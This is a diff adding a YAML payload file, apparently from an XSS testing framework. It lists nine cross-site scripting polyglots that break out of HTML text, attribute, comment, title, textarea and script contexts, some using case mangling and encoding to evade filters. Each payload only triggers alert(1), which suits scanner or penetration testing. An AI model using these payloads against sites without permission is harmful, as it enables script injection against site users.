@@ -1,0 +1,54 @@
+# XSS Framework — Polyglot Payload Set
+# Multi-context payloads designed to execute across HTML text, attribute,
+# JavaScript string, and URL contexts simultaneously.
+category: polyglot
+payloads:
+  - text: |-
+      javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+    tags: [polyglot, javascript-url, multi-context, classic]
+    description: Classic XSS polyglot covering URL, HTML, attribute, and JS contexts
+    severity: high
+
+  - text: |-
+      jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
+    tags: [polyglot, multi-context, case-mangling, url-encoded]
+    description: Extended polyglot with case mangling, URL encoding, and context escapes
+    severity: high
+
+  - text: "'\"><img src=x:x onerror=alert(1)//>"
+    tags: [polyglot, attribute-breakout, img, multi-context]
+    description: Breaks double-quoted, single-quoted, and unquoted attribute contexts
+    severity: high
+
+  - text: |-
+      --><script>alert(1)</script><!--
+    tags: [polyglot, comment-breakout, script-injection]
+    description: Breaks out of HTML comment context then injects script
+    severity: high
+
+  - text: '</script><script>alert(1)</script>'
+    tags: [polyglot, script-breakout, script-injection]
+    description: Close any open script block then inject new script
+    severity: high
+
+  - text: '</style></title></textarea><script>alert(1)</script>'
+    tags: [polyglot, multi-tag-close, script-injection]
+    description: Close multiple possible parent contexts before injecting script
+    severity: high
+
+  - text: '<script src=data:,alert(1)></script>'
+    tags: [polyglot, script-injection, data-uri]
+    description: "Script with inline data: URI source"
+    severity: high
+
+  - text: |-
+      </title><script>alert(1)</script>
+    tags: [polyglot, title-breakout, script-injection]
+    description: Break out of title context then inject script
+    severity: medium
+
+  - text: |-
+      </textarea><script>alert(1)</script>
+    tags: [polyglot, textarea-breakout, script-injection]
+    description: Break out of textarea context then inject script
+    severity: medium
